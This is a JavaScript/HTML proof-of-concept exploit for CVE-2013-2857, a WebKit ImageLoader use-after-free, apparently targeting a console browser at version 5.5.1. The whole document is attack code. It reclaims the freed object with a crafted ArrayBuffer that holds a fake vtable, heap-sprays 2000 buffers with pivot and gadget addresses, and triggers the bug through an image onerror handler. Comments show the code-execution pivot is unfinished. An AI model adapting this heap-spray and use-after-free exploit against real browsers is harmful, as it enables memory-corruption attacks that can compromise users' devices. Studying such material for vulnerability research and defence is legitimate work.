<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash
-->
<script>
function UaF(a)
{	
    var BLR                     = 0x01012170;
    var OS_Exit                 = 0x0101cd80;
    var pivotAdressAdress       = 0x1B000000; //r6
    var pivotAdress             = BLR; //OS_Exit;
    var sizeWebCoreImageLoader  = 0x18;
    var sprayCount              = 2000;
    var _4K                     = 0x1000;
    
	//radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
    a.type="radio";
	
	//Allocate this new WebCore::ImageLoader over freed WebCore::
    var ab = new ArrayBuffer(sizeWebCoreImageLoader);
    var dv = new DataView(ab)

    /*
    0:000:x86> dt webkit!WebCore::ImageLoader
       +0x000 __VFN_table : Ptr32 
       +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
       +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
       +0x00c m_failedLoadURL  : WTF::AtomicString
       +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
       +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
       +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
       +0x010 m_imageComplete  : Pos 3, 1 Bit
       +0x010 m_loadManually   : Pos 4, 1 Bit
       +0x010 m_elementIsProtected : Pos 5, 1 Bit
    */
    //Register:r3 Adress:0x1AF35330-0x1AF35360
    dv.setUint32(0x00, 0x41414141);         //vtable
    dv.setUint32(0x04, pivotAdressAdress);  //m_client
    dv.setUint32(0x08, 0x00000000);         //m_image, must be NULL
    dv.setUint32(0x0C, pivotAdressAdress+0x200);         //m_failedLoadURL
    dv.setUint32(0x10, 0x43434343);         //m_hasPendingBeforeLoadEvent
    dv.setUint32(0x14, 0x44444444);         //padding
	
    //Spray large ArrayBuffer with pivotAdress	
    //Middle range 0x1B000000
    var ar = new Array(sprayCount);
    for(var i=0; i<sprayCount; i++){
        ar[i] = new DataView(new ArrayBuffer(_4K));
        for(var j=0; j<_4K; j+=4){
            ar[i].setUint32(j, 0x0000+j); //filler
        }
        ar[i].setUint32(0x24, pivotAdressAdress);   //lwz r31, 0x24(r6)
                                                    //...
        ar[i].setUint32(0x00, pivotAdressAdress);   //lwz r7, 0x0(r31)
        ar[i].setUint32(0xEC, BLR);                 //lwz r9, 0xEC(r7) //pivot ?
        //...
        
        ar[i].setUint32(0x5C, pivotAdressAdress+0x60);
        ar[i].setUint32(0x60, pivotAdressAdress+0x100); //??????
        
        ar[i].setUint32(0x68, pivotAdressAdress+0x70); 
        ar[i].setUint32(0x70, BLR);  
        ar[i].setUint32(0x9C, BLR);                 //r9
        
        
        ar[i].setUint32(0x29C, BLR);                //r9
        ar[i].setUint32(0x2A4, BLR);
        
        ar[i].setUint32(0x100, 0x41414141); //??????
        
        ar[i].setUint32(0x88, pivotAdressAdress+0x400);
        ar[i].setUint32(0x400, 0x00);
        
        ar[i].setUint32(0x408, pivotAdressAdress+0x40C);
        
        
        ar[i].setUint32(0x404, 0x49494949);
        ar[i].setUint32(0x438, 0x48484848);                //r9=0x404
        
        //ar[i].setUint32(0x40C, BLR);   
        /*ar[i].setUint32(0x9C, BLR);    
        
        //StringImpl 
        ar[i].setUint32(0x29C, BLR);
        ar[i].setUint32(0x2A4, BLR);
        //ar[i].setUint32(0x68, 0x01010230);         //lwz r9, 0xEC(r31) //can be NULL
        
        //other struct
        ar[i].setUint32(0x400, pivotAdressAdress+0x500);  
        ar[i].setUint32(0x408, pivotAdressAdress+0x40C);   
        
        ar[i].setUint32(0x438, BLR);    //r9 = 0x41410404 ! << BINGO ? TODO: mov [r9], shit & need to no crash !
        
        //Chained List
        
        ar[i].setUint32(0x500, pivotAdressAdress+0x86C) //chain list ?
        
        ar[i].setUint32(0x508, pivotAdressAdress+0xA00) //chain list ?
        ar[i].setUint32(0x50C, pivotAdressAdress+0x600) //chain list ?
        
        ar[i].setUint32(0x600, pivotAdressAdress+0x700) //chain list ?
        ar[i].setUint32(0x60C, 0x0);
        
        
        ar[i].setUint32(0x86C, BLR);
        ar[i].setUint32(0x608, pivotAdressAdress+0x800);
        ar[i].setUint32(0x818, pivotAdressAdress+0x900);
        ar[i].setUint32(0xA18, pivotAdressAdress+0xB00);
        ar[i].setUint32(0xA90, 0x0);
        ar[i].setUint32(0xB24, pivotAdressAdress+0xB80);
        ar[i].setUint32(0xB24, pivotAdressAdress+0xB80);
        
        ar[i].setUint32(0xC28, BLR); //r5 & r31
        
        ar[i].setUint32(0xC4C, pivotAdressAdress+0xC50);
        ar[i].setUint32(0xC50, pivotAdressAdress+0xC58);
        ar[i].setUint32(0xC58, 0x0);
        ar[i].setUint32(0xC5C, pivotAdressAdress+0xC60);
        ar[i].setUint32(0xC60, BLR);*/
        
        //        
    }
    
    
	//Use the new WebCore::ImageLoader & pivot !
	return 0;
}
</script>

<input id="x" type="image" onerror="UaF(this);" src=""/>